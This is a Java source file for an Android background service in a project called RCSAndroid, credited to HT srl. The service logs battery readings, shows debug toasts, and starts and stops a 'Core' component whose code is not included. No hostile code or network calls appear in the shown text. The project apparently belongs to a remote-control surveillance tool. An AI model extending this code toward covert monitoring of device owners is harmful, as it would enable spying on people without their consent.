/**********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

/**
 * The Class RCSAndroid.
 */
public class RCSAndroid extends Service {

	/** The core. */
	private Core core;

	/** The battery receiver. */
	BroadcastReceiver batteryReceiver;

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onBind(android.content.Intent)
	 */
	@Override
	public IBinder onBind(final Intent intent) {
		return null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		super.onCreate();

		registerListeners();
		Toast.makeText(this, "- Service Created", Toast.LENGTH_LONG).show();

		Status.setAppContext(getApplicationContext());
	}

	/**
	 * Register listeners.
	 */
	private void registerListeners() {
		registerBattery();
	}

	/**
	 * Register battery.
	 */
	private void registerBattery() {
		batteryReceiver = new BroadcastReceiver() {
			int scale = -1;
			int level = -1;
			int voltage = -1;
			int temp = -1;

			@Override
			public void onReceive(final Context context, final Intent intent) {
				level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
				scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
				temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, -1);
				voltage = intent.getIntExtra(BatteryManager.EXTRA_VOLTAGE, -1);
				Log.d("BatteryManager", "level is " + level + "/" + scale
						+ ", temp is " + temp + ", voltage is " + voltage);
			}
		};
		final IntentFilter filter = new IntentFilter(
				Intent.ACTION_BATTERY_CHANGED);
		registerReceiver(batteryReceiver, filter);
	}

	/**
	 * Unregister listeners.
	 */
	private void UnregisterListeners() {
		unregisterReceiver(batteryReceiver);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();

		Toast.makeText(this, "- Stopping thread", Toast.LENGTH_LONG).show();

		UnregisterListeners();

		// Core stops
		core.Stop();
		core = null;

		Toast.makeText(this, "- Service Destroyed", Toast.LENGTH_LONG)
				.show();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onStart(android.content.Intent, int)
	 */
	@Override
	public void onStart(final Intent intent, final int startId) {
		super.onStart(intent, startId);

		Toast.makeText(this, "Que - Service Started, starting thread",
				Toast.LENGTH_LONG).show();

		core = new Core();

		// Core starts
		core.Start(this.getResources(), getContentResolver());
	}
}
